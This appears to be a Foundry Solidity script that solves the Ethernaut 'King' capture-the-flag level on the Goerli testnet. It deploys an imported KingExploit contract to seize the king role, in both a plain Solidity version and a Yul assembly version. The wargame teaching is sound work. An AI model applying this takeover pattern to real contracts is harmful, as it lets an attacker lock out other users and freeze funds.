// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { KingExploit } from "../../contracts/9_King.sol";

interface Instance {
    function owner() external view returns (address);

    function prize() external view returns (uint);

    function _king() external view returns (address);
}

contract KingScript is EthernautScript {
    string network = "goerli";
    address level = 0x725595BA16E76ED1F6cC1e1b65A88365cC494824;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0.001 ether));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        KingExploit kingExploit = new KingExploit{ value: instance.prize() }(address(instance));
        require(address(kingExploit) == instance._king());
    }

    function yulVersion() internal {
        bytes memory initCode = type(KingExploit).creationCode;

        assembly {
            let king := sload(instance.slot)

            mstore(0, "prize()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), king, 0, 4, 0, 0x20))
            let prize := mload(0)

            // deploy KingExploit contract
            let size := mload(initCode)
            let offsetArg := add(add(initCode, 0x20), size)
            mstore(initCode, add(size, 0x20))
            mstore(offsetArg, king)
            let kingExploit := create(prize, add(initCode, 0x20), mload(initCode))

            // check if `king` was updated
            mstore(0, "_king()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), king, 0, 4, 0, 0x20))
            if iszero(eq(kingExploit, mload(0))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
